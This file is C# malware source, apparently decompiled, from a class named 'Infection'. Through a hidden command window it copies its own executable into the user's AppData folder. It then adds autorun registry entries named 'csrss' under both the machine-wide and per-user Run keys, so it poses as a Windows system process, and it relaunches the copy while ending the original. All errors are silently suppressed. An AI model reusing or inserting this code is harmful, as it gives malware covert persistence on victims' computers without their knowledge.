using System;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MI_CSRSS;

internal class Infection
{
	public static void copy2paths()
	{
		string text = Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe";
		Process process = new Process();
		if (Application.get_ExecutablePath() != text)
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.Arguments = "/c copy /y \"" + Application.get_ExecutablePath() + "\" \"" + text + "\"";
				process.StartInfo = processStartInfo;
				process.Start();
			}
			catch
			{
			}
			try
			{
				Registry.LocalMachine.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue("csrss", text);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue("csrss", text);
			}
			catch
			{
			}
			try
			{
				process.WaitForExit();
			}
			catch
			{
			}
			try
			{
				Process.Start(text);
			}
			catch
			{
			}
			Process.GetCurrentProcess().Kill();
		}
	}
}
